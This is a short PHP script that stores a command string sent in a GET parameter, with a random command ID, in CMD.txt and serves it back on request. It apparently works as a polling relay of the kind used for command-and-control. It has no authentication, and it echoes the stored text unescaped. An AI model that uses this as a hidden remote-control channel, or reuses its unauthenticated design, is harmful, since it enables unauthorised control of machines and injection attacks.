<?php

$file_name = "CMD.txt";

//WRITE A COMMAND
function write_cmd($content) 
{
    $file_name = "CMD.txt";
    if (file_put_contents($file_name, $content)) {
        echo "SUCESS";
    } else {
        echo "ERROR";
    }
    
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    
    $action = $_GET['action'];

    if ($action === "send-action") 
    {
        $param = $_GET['param'];
        $randomNumber = mt_rand(10000, 99999);
        $fileText = "!CMDID=" . $randomNumber . "!\n" . $param;
        write_cmd($fileText);
    }

    if ($action === "get-action") 
    {
        $content = file_get_contents($file_name);

        if ($content !== false) {
            echo nl2br($content);
        } else {
            echo "ERROR";
        }
    }
}

?>
